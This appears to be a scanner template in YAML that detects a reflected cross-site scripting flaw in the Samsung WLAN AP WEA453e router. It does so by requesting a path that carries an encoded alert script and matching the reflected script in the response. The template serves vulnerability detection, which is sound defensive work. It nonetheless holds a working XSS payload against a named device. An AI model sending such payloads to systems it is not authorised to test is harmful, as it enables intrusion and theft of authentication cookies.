id: "samsung-wlan-ap-xss"
name: "Samsung WLAN AP WEA453e - Cross-Site Scripting"
severity: "high"
description: "Samsung WLAN AP WEA453e router contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks."
tech:
  - "generic"
tags:
  - "xss"
  - "samsung"
  - "vuln"
cwe: "CWE-80"
reference: "https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/"
spaExclusion: true
request:
  method: "GET"
  path: "/%3Cscript%3Ealert(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "/tmp/www/<script>alert(document.domain)</script>"
  - type: "status"
    status:
      - 404
  - type: "word"
    part: "header"
    words:
      - "text/html"
